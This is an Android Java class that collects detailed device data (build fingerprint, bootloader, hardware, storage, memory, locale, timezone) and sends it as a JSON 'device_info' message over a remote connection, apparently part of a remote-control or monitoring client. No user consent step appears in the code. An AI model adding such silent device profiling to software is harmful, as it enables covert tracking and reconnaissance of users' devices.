package com.Deviant.pro;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.WindowMetrics;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Arrays;
import java.util.Locale;

public class DeviceInfoManager {

    private static final String TAG = "DeviceInfoManager";

    public static void getInfo(Context context) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "device_info");

            jo.put("system",   buildSystemInfo());
            jo.put("hardware", buildHardwareInfo(context));
            jo.put("storage",  buildStorageInfo());
            jo.put("memory",   buildMemoryInfo(context));
            jo.put("locale",   buildLocaleInfo());

            ConnectionManager.send(jo.toString());
            Log.d(TAG, "Device info sent");

        } catch (Exception e) {
            Log.e(TAG, "Failed to collect device info: " + e.getMessage(), e);
            sendError(e.getMessage());
        }
    }

    // -------------------------------------------------------------------------
    // Section builders
    // -------------------------------------------------------------------------

    private static JSONObject buildSystemInfo() throws Exception {
        JSONObject obj = new JSONObject();
        obj.put("model",        Build.MODEL);
        obj.put("manufacturer", Build.MANUFACTURER);
        obj.put("brand",        Build.BRAND);
        obj.put("device",       Build.DEVICE);
        obj.put("product",      Build.PRODUCT);
        obj.put("hardware",     Build.HARDWARE);
        obj.put("board",        Build.BOARD);
        obj.put("bootloader",   Build.BOOTLOADER);
        obj.put("display_id",   Build.DISPLAY);
        obj.put("fingerprint",  Build.FINGERPRINT);
        obj.put("android",      Build.VERSION.RELEASE);
        obj.put("sdk",          Build.VERSION.SDK_INT);
        obj.put("security_patch",
                Build.VERSION.SECURITY_PATCH); // API 23+
        return obj;
    }

    private static JSONObject buildHardwareInfo(Context context) throws Exception {
        JSONObject obj = new JSONObject();

        // ✅ Build.CPU_ABI / CPU_ABI2 deprecated since API 21
        // Use SUPPORTED_ABIS — ordered best-to-worst
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            JSONArray abis = new JSONArray();
            for (String abi : Build.SUPPORTED_ABIS) abis.put(abi);
            obj.put("cpu_abis", abis);
        }

        // ✅ Use WindowMetrics on API 30+ for real display size
        //    (DisplayMetrics returns app-window size on multi-window/foldables)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            WindowMetrics wm = ((WindowManager)
                    context.getSystemService(Context.WINDOW_SERVICE))
                    .getCurrentWindowMetrics();
            android.graphics.Rect bounds = wm.getBounds();
            obj.put("resolution", bounds.width() + "x" + bounds.height());
        } else {
            DisplayMetrics dm = context.getResources().getDisplayMetrics();
            obj.put("resolution", dm.widthPixels + "x" + dm.heightPixels);
        }

        // DPI is safe from DisplayMetrics regardless of API level
        DisplayMetrics dm = context.getResources().getDisplayMetrics();
        obj.put("dpi",     dm.densityDpi);
        obj.put("density", dm.density);

        return obj;
    }

    private static JSONObject buildStorageInfo() throws Exception {
        JSONObject obj = new JSONObject();

        StatFs internal = new StatFs(Environment.getDataDirectory().getPath());
        long intTotal = internal.getTotalBytes();
        long intFree  = internal.getAvailableBytes();
        obj.put("internal_total_mb", intTotal  / (1024 * 1024));
        obj.put("internal_free_mb",  intFree   / (1024 * 1024));
        obj.put("internal_used_mb",  (intTotal - intFree) / (1024 * 1024));

        // External storage (may not be present)
        try {
            StatFs external = new StatFs(
                    Environment.getExternalStorageDirectory().getPath());
            obj.put("external_total_mb", external.getTotalBytes()     / (1024 * 1024));
            obj.put("external_free_mb",  external.getAvailableBytes() / (1024 * 1024));
        } catch (Exception e) {
            obj.put("external", "unavailable");
        }

        return obj;
    }

    private static JSONObject buildMemoryInfo(Context context) throws Exception {
        JSONObject obj = new JSONObject();
        ActivityManager.MemoryInfo mem = new ActivityManager.MemoryInfo();
        ((ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE))
                .getMemoryInfo(mem);

        obj.put("total_ram_mb",     mem.totalMem  / (1024 * 1024));
        obj.put("available_ram_mb", mem.availMem  / (1024 * 1024));
        obj.put("used_ram_mb",
                (mem.totalMem - mem.availMem) / (1024 * 1024));
        obj.put("low_memory",       mem.lowMemory);
        obj.put("low_memory_threshold_mb", mem.threshold / (1024 * 1024));

        return obj;
    }

    private static JSONObject buildLocaleInfo() throws Exception {
        JSONObject obj = new JSONObject();
        Locale locale = Locale.getDefault();
        obj.put("language",     locale.getLanguage());
        obj.put("country",      locale.getCountry());
        obj.put("display_name", locale.getDisplayName());
        obj.put("timezone",     java.util.TimeZone.getDefault().getID());
        return obj;
    }

    // -------------------------------------------------------------------------
    // Error helper
    // -------------------------------------------------------------------------

    private static void sendError(String message) {
        try {
            JSONObject err = new JSONObject();
            err.put("type",  "device_info");
            // e.getMessage() can return null — fall back to class name
            err.put("error", message != null ? message : "unknown_error");
            ConnectionManager.send(err.toString());
        } catch (Exception ignored) {}
    }
}
